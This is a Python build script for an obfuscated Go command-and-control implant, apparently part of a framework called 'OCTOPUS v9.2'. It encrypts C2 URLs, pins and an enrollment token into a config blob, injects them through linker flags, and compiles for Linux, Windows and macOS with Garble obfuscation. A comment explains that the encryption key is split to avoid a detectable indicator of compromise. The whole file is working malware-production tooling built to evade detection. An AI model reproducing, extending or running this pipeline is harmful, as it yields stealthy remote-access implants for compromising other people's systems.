#!/usr/bin/env python3
"""
Automated Go Implant Build Pipeline

Features:
- Reads the generated X25519 C2 Server Public Key
- Injects the public key and C2 URL into the implant at build time via ldflags
- Compiles using Garble for heavy obfuscation (-tiny -literals)
"""

import base64
import os
import subprocess
import sys

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

from core.c2.protocol import C2_SESSION_KDF_CONTEXT

C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_RESET  = "\033[0m"


def _go_linker_flags(
    config_blob: str,
    key_part1: str,
    key_part2: str,
) -> str:
    """Serialize build-time values, including the canonical wire context."""
    session_context = C2_SESSION_KDF_CONTEXT.decode("ascii")
    return (
        f"-s -w -X 'main.EncBlob={config_blob}' "
        f"-X 'main.KP1={key_part1}' "
        f"-X 'main.KP2={key_part2}' "
        f"-X 'main.SessionKDFContext={session_context}'"
    )

def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
    """Return the raw 32-byte X25519 public key as base64."""
    if not os.path.exists(key_path):
        raise FileNotFoundError(
            f"Public key not found at {key_path}. Start the C2 server first."
        )

    with open(key_path, "rb") as handle:
        public_key = serialization.load_pem_public_key(handle.read())
    if not isinstance(public_key, x25519.X25519PublicKey):
        raise ValueError("C2 public key is not an X25519 key")
    raw = public_key.public_bytes(
        serialization.Encoding.Raw,
        serialization.PublicFormat.Raw,
    )
    return base64.b64encode(raw).decode("ascii")

def encrypt_config(
    c2_urls: str,
    pins: str,
    server_pub: str,
    enrollment_token: str,
) -> tuple[str, str]:
    """Encrypt config into an AES-GCM blob and return (b64_blob, hex_key)."""
    import json

    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    
    config = {
        "urls": c2_urls,
        "pins": pins,
        "pub": server_pub,
        "enrollment_token": enrollment_token,
    }
    
    plaintext = json.dumps(config).encode("utf-8")
    key = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    blob = base64.b64encode(nonce + ciphertext).decode("utf-8")
    
    return blob, key.hex()

def build_implant(
    os_target="linux",
    arch_target="amd64",
    c2_urls="http://127.0.0.1:8443",
    pins="",
    enrollment_token="",
):
    base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    key_path = os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
    src_file = os.path.join(base_dir, "core", "c2", "implant.go")
    
    out_ext = ".exe" if os_target == "windows" else ""
    out_file = os.path.join(base_dir, "data", f"implant_{os_target}_{arch_target}{out_ext}")
    
    if isinstance(c2_urls, (list, tuple)):
        c2_urls = ",".join(str(item) for item in c2_urls)
    if os_target not in {"linux", "windows", "darwin"}:
        raise ValueError(f"Unsupported target OS: {os_target}")
    if arch_target not in {"amd64", "arm64"}:
        raise ValueError(f"Unsupported target architecture: {arch_target}")

    server_pub = load_server_pub_key(key_path)
    if not enrollment_token:
        from core.c2.enrollment import EnrollmentAuthority

        enrollment_token = EnrollmentAuthority(
            os.path.join(base_dir, "data", "keys", "enrollment.key")
        ).issue()
    
    print(f"  {C_CYAN}[*] Starting Garble Build Pipeline for {os_target}/{arch_target}{C_RESET}")
    print(f"  {C_CYAN}[*] Encrypting configuration blob...{C_RESET}")
    
    config_blob, hex_key = encrypt_config(
        c2_urls, pins, server_pub, enrollment_token
    )
    
    # We split the hex key into two parts to avoid a single static 32-byte string IOC
    key_part1 = hex_key[:32]
    key_part2 = hex_key[32:]
    
    # Setup ldflags to inject the encrypted blob and split keys
    ldflags = _go_linker_flags(config_blob, key_part1, key_part2)
    
    env = os.environ.copy()
    env["GOOS"] = os_target
    env["GOARCH"] = arch_target
    
    # Command to build using garble
    cmd = [
        "garble",
        "-tiny",
        "-literals",
        "build",
        "-ldflags", ldflags,
        "-o", out_file,
        src_file
    ]
    
    core_c2_dir = os.path.join(base_dir, "core", "c2")
    
    print(f"  {C_CYAN}[*] Downloading Go dependencies (go mod tidy)...{C_RESET}")
    try:
        subprocess.run(
            ["go", "mod", "tidy"],
            cwd=core_c2_dir,
            check=True,
            capture_output=True,
            timeout=300,
        )
    except subprocess.CalledProcessError as e:
        print(f"  {C_RED}[!] Failed to download Go dependencies:{C_RESET}\n{e.stderr.decode('utf-8', errors='ignore')}")
        sys.exit(1)
        
    try:
        # Check if garble is installed
        subprocess.run(
            ["garble", "version"],
            capture_output=True,
            check=True,
            timeout=15,
        )
    except FileNotFoundError:
        print(f"  {C_RED}[!] 'garble' is not installed or not in PATH.{C_RESET}")
        print(f"  {C_YELLOW}Install with: go install mvdan.cc/garble@latest{C_RESET}")
        print(f"  {C_YELLOW}Also make sure ~/go/bin is in your PATH.{C_RESET}")
        sys.exit(1)
        
    print(f"  {C_CYAN}[*] Running: {' '.join(cmd)}{C_RESET}")
    
    try:
        subprocess.run(
            cmd,
            env=env,
            cwd=core_c2_dir,
            check=True,
            timeout=600,
        )
        print(f"  {C_GREEN}[+] Build complete: {out_file}{C_RESET}")
        return out_file
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Go implant build failed: {e}") from e

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="OCTOPUS v9.2 Implant Builder")
    parser.add_argument("--os", default="linux", help="Target OS (linux/windows/darwin)")
    parser.add_argument("--arch", default="amd64", help="Target Architecture (amd64/arm64)")
    parser.add_argument("--urls", default="http://127.0.0.1:8443", help="Comma-separated list of C2 URLs (Fallbacks)")
    parser.add_argument("--pins", default="", help="Comma-separated list of SHA-256 SPKI base64 pins")
    
    args = parser.parse_args()
    build_implant(args.os, args.arch, args.urls, args.pins)
